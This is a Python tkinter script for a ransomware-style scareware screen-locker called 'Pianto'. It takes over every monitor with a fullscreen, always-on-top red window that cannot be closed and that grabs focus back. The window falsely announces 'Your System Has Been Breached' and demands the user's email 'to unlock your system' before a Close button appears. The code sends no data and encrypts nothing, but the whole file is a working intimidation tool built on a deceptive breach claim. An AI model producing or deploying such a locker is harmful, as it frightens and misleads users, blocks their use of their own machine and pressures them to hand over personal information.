import tkinter as tk
from screeninfo import get_monitors

def get_name_on_all_monitors():
    # Temporarily remove topmost so popups can appear
    window.attributes("-topmost", False)

    name_var = tk.StringVar()

    popups = []

    for monitor in get_monitors():
        popup = tk.Toplevel(window)
        popup.title("Pianto")
        popup.geometry("450x200")
        popup.configure(bg="black")
        popup.transient(window)
        popup.grab_set()
        popup.focus_force()

        # Center popup on this monitor
        x = monitor.x + (monitor.width // 2 - 225)
        y = monitor.y + (monitor.height // 2 - 100)
        popup.geometry(f"+{x}+{y}")

        # Title label
        tk.Label(
            popup, text="Enter Your Email To Unlock Your System", font=("Arial", 18, "bold"), bg="black", fg="white"
        ).pack(pady=(20, 10))

        # Entry box
        entry = tk.Entry(popup, textvariable=name_var, font=("Arial", 16), width=25,
                         justify='center', bg="white", fg="black")
        entry.pack(pady=10)
        entry.focus_set()

        # Submit button
        def submit(p=popup):
            if name_var.get().strip():
                # Destroy all popups when submitted
                for w in popups:
                    w.destroy()

        submit_btn = tk.Button(popup, text="Submit", command=submit,
                               font=("Arial", 14), bg="#4CAF50", fg="Black", width=12)
        submit_btn.pack(pady=15)

        popups.append(popup)

    popup.wait_window()  # Wait until at least one popup is submitted
    window.attributes("-topmost", True)
    return name_var.get().strip()


# Main window
window = tk.Tk()
window.title("Pianto")
window.attributes("-fullscreen", True)
window.overrideredirect(True)
window.configure(bg="red")
window.attributes("-topmost", True)
window.protocol("WM_DELETE_WINDOW", lambda: None)

# Center frame
center_frame = tk.Frame(window, bg="red")
center_frame.pack(expand=True)

# Title label
title_label = tk.Label(center_frame, text="Your System Has Been Breached By Pianto", font=("Arial", 30, "bold"), bg="red", fg="white")
title_label.pack(pady=20)

# Greeting label
greeting_label = tk.Label(center_frame, text="", font=("Arial", 24), bg="red", fg="white")
greeting_label.pack(pady=20)

# Refocus if window loses focus
def refocus(event):
    window.lift()
    window.focus_force()

window.bind("<FocusOut>", refocus)

# Ask for name until valid input
def ask_name():
    name = ""
    while not name:
        name = get_name_on_all_monitors()
    greeting_label.config(text=f"Hello, {name}! I am Pianto.")
    close_btn = tk.Button(center_frame, text="Close", command=window.destroy, font=("Arial", 16))
    close_btn.pack(pady=30)

window.after(500, ask_name)
window.mainloop()
